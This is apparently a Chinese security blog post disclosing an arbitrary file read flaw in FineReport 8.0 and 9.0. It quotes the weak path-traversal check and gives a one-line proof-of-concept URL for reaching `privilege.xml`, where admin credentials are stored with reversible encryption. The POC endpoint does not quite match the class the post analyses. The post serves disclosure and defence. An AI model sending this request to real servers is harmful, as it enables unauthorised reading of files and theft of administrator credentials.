---
title: FineReport 任意文件读取漏洞
date: 2024-04-19
tags:
  - 安全研究
  - CVE
  - 文件读取
  - Java
---

## 漏洞简介

FineReport 存在任意文件读取漏洞，攻击者可通过该漏洞读取服务器上的任意文件，包括存储管理员账号密码的配置文件。

## 漏洞影响

- FineReport v8.0
- FineReport v9.0

## 复现过程

漏洞代码位于 `fr-chart-8.0.jar` 文件的 `com.fr.chart.web.ChartGetFileContentAction` 中。

该类由 `ActionNoSessionCMD` 扩展而来，对用户权限做了简单认证。通过 request 将文件名传入，同时使用 `cjkDecode` 函数解密文件名（对传入文件名无实质影响），接着使用 `invalidResourcePath` 函数验证文件名合法性：

```java
public static boolean invalidResourcePath(String paramString) {
    return (StringUtils.isEmpty(paramString) || paramString.indexOf(false) != -1)
        ? true
        : (paramString.startsWith("http")
            ? (paramString.indexOf("127.0.0.1") != -1 || paramString.indexOf("localhost") != -1)
            : (paramString.indexOf("..") != -1 && paramString.split("\\Q..\\E").length > 3));
}
```

该校验仅限制 `..` 出现 3 次以上，单次路径穿越仍可绕过。

最终使用 `readResource` 函数读取文件流并返回浏览器。默认读取 `resources` 目录下的文件，其中 `privilege.xml` 存储了超级管理员的账号和加密密码。由于解密函数内置在 jar 包中且使用硬编码方式，获取加密字符串即等同于获取明文密码。

## POC

```
http://target:8080/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true
```

## 参考链接

- https://www.freesion.com/article/1056237571/
